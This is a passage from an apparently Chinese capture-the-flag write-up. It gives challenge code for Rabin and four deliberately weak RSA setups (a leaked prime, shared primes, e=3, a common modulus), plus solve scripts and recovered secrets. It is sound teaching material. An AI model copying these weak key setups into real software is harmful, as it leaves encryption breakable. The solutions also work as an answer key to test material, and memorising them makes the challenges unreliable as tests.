class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h2><p>使用xenny库直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="keyword">import</span> rabin</span><br><span class="line">p=<span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q=<span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c=<span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">n=p*q</span><br><span class="line">m1,m2,m3,m4=rabin.attack(c,n,p,q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3)+long_to_bytes(m4))</span><br></pre></td></tr></table></figure><h1 id="RSA-大冒险1"><a href="#RSA-大冒险1" class="headerlink" title="RSA 大冒险1"></a>RSA 大冒险1</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><blockquote><p>描述：马上要过年喽，兔兔开心地去超市买年货，但是超市门口却写着”只有完成挑战才能进入超市”，你能帮帮兔兔吗</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#task.py</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> challenges.challenge1 <span class="keyword">import</span> RSAServe <span class="keyword">as</span> C0S</span><br><span class="line"><span class="keyword">from</span> challenges.challenge2 <span class="keyword">import</span> RSAServe <span class="keyword">as</span> C1S</span><br><span class="line"><span class="keyword">from</span> challenges.challenge3 <span class="keyword">import</span> RSAServe <span class="keyword">as</span> C2S</span><br><span class="line"><span class="keyword">from</span> challenges.challenge4 <span class="keyword">import</span> RSAServe <span class="keyword">as</span> C3S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = flag = <span class="string">b&#x27;hgame&#123;This is a fake flag&#125;&#x27;</span></span><br><span class="line">SCORE = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> ____  ____    _    </span></span><br><span class="line"><span class="string">|  _ \/ ___|  / \   </span></span><br><span class="line"><span class="string">| |_) \___ \ / _ \  </span></span><br><span class="line"><span class="string">|  _ &lt; ___) / ___ \ </span></span><br><span class="line"><span class="string">|_| \_\____/_/   \_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here are four challenges(1, 2, 3, 4), solve them all then you can get flag.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">MEMU = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/----------------------------\\</span></span><br><span class="line"><span class="string">|          options           |</span></span><br><span class="line"><span class="string">| 1. get public key          |</span></span><br><span class="line"><span class="string">| 2. get cipher text         |</span></span><br><span class="line"><span class="string">| 3. check                   |</span></span><br><span class="line"><span class="string">\\---------------------------/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">timeout_handler</span>(<span class="params">self, signum, frame</span>):</span><br><span class="line">        <span class="keyword">raise</span> TimeoutError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Serve</span>(<span class="params">self, S</span>):</span><br><span class="line">        self.send(MEMU.encode())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            option = self.recv()</span><br><span class="line">            <span class="keyword">if</span> option == <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">                pubkey = S.pubkey()</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> pubkey:</span><br><span class="line">                    self.send(<span class="built_in">str</span>(s).encode())</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="string">b&#x27;2&#x27;</span>:</span><br><span class="line">                c = S.encrypt()</span><br><span class="line">                self.send(c.encode())</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="string">b&#x27;3&#x27;</span>:</span><br><span class="line">                usr_answer = self.recv(<span class="string">b&quot;input your answer: &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> S.check(usr_answer)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;invaild option&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.signal(signal.SIGALRM, self.timeout_handler)</span><br><span class="line">        signal.alarm(<span class="number">600</span>)</span><br><span class="line"></span><br><span class="line">        self.send(BANNER.encode())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(<span class="string">f&#x27;your score <span class="subst">&#123;<span class="built_in">sum</span>(SCORE)&#125;</span>&#x27;</span>.encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(SCORE) == <span class="number">4</span>:</span><br><span class="line">                self.send(FLAG)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.send(<span class="string">b&#x27;select challange&#x27;</span>)</span><br><span class="line">            code = self.recv()</span><br><span class="line">            <span class="keyword">if</span> code == <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">                S = C0S()</span><br><span class="line">                res = self.Serve(S)</span><br><span class="line">                <span class="keyword">if</span> res == <span class="literal">True</span>:</span><br><span class="line">                    SCORE[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> code == <span class="string">b&#x27;2&#x27;</span>:</span><br><span class="line">                S = C1S()</span><br><span class="line">                res = self.Serve(S)</span><br><span class="line">                <span class="keyword">if</span> res == <span class="literal">True</span>:</span><br><span class="line">                    SCORE[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> code == <span class="string">b&#x27;3&#x27;</span>:</span><br><span class="line">                S = C2S()</span><br><span class="line">                res = self.Serve(S)</span><br><span class="line">                <span class="keyword">if</span> res == <span class="literal">True</span>:</span><br><span class="line">                    SCORE[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> code == <span class="string">b&#x27;4&#x27;</span>:</span><br><span class="line">                S = C3S()</span><br><span class="line">                res = self.Serve(S)</span><br><span class="line">                <span class="keyword">if</span> res == <span class="literal">True</span>:</span><br><span class="line">                    SCORE[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;invaild input&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10002</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>得到qr后在<a href="http://factordb.com/">factordb.com</a>分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">419068998475498390583641618710190878295191785057764401142713162489243729086236485524226836964016579</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">334687917416655213473477000970630430903</span></span><br><span class="line">c = <span class="number">0x54773108c4f0914f4ae54f06700742c7b8da14b9704a87af62e4ddd0d9ff6f6d559c0b239a5d62a53c</span></span><br><span class="line">qr=n//p</span><br><span class="line">q = <span class="number">1150347873132740419571666919937</span></span><br><span class="line">r = <span class="number">1088469605156490512126824552789</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#m&lt;n_But_also_m&lt;p</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><img src="https://s1.vika.cn/space/2023/02/07/d865c409427c4e2c88861c0af6c324f4" alt="image-20230207230710119"></p><p>得到两个n1，n2,且有公因子</p><p>所以求最大公因数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1=<span class="number">87087833348675444070046528653976774080448902160272690912556764910192224852983988575845738991248972020721446241705511870497189725619567483358987218937565128814190068297677234560712463611246336923590047997846335578319296354668983581819453364846479964959022613433226220737128285885507756703474505694339826333293</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c1=<span class="number">0x133a1a71fc9f1aaf526d5e8760cf2a3ff5212b59b3907f26120cf74bbe8c68ddf96325951d68f29eaf7937cdeed1604f5a46ad837615775a09c3aa7427858c2f2de3cc0a01ed79c9c361d523044cb2b39ffeb59bbc003c451c038c70ec65ec433d4d77860f83c7c5b18f3d0bfd559394757f55b6929c3d883ba0e6e1b354d899</span></span><br><span class="line">n2=<span class="number">112289657975047178475643219244221584859211440644709211424559061118437547868059532221426289601505187721548153096313009586821376045769136432736323917252801490686574067048071015433512783584954707635910969444577808622600201183516070651460679501027588374321900014221597561059621880320962550297253495322593060237259</span></span><br><span class="line">c2=<span class="number">0x4c0b8c065f6ffc52f3a54aa7f6413506cc1c52fa36cbfdab7db7adc603b0267be8d56e47a0dc6c558c80e2c2f097f8ca052fb517455d9cd6481cb1b0588c8f6f49227ea40af088713ab76dc69db1d6445212d27d919818f728dd59bf8c4e44d52add9e97761afc89802da00fa9454a53e83969786a70120f917b97ec417fb859</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>e很小，直接开根</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">85694625507088329389720805101164284142247398546155650378770804836966718831875670624869242735764105573045749372536066101935061609716108771329659690488228518041228302400437490389374337239080044737508485180509095585412087599455215699832018051094855928374686705605164233377531208864238405716340998401000444894481</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=<span class="number">120759954248534964352917525788020487404278240249007305052238663406226775856603906601805436752674759360332299150411161244240032163980725721404901052003458454487468564211906637280511850199908639258731829025634756044226471216286677502852604874682515150475509407445226458314799196193245534559956189299925521445507</span></span><br><span class="line">e1=<span class="number">126761</span></span><br><span class="line">c1=<span class="number">0x895fe8473d65257da58c534343f33e5df884343137a1ce2d120e955ba16a0838685659ca153a143b2e38b0d1d0261615c2f5c35d3057cae7b5fe82aa8a7116e11d9012d902aec060d4bddf238654883193ddb44fe0b3b2bf5b9987727a7246a56d81fd7b3a010e83fb79df3cead52d9d41bf5366ed809a532fdf02b5eccf23d7</span></span><br><span class="line">e2=<span class="number">109397</span></span><br><span class="line">c2=<span class="number">0xd531d7252d7cd4ad11481d5ae40e5c7ae2a727e9a2bc97e10dc407f1ac0983a58d6075eb37aa11d83b553b41092f2831a9ecd333753462fdcacbd7cd8c64bcffdf479bd49ed76bd5aa47642f58d623c244d1e6e26cd7b23da662f7ebfe02601bed3a346e1a3814a71c1a70ceb043c196ad3586fbfc89a4940baea8bdc390cf4</span></span><br><span class="line">S=gmpy2.gcdext(e1,e2)</span><br><span class="line">s1=S[<span class="number">1</span>]</span><br><span class="line">s2=S[<span class="number">2</span>]</span><br><span class="line">m=(gmpy2.powmod(c1,s1,n)*gmpy2.powmod(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span> (m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
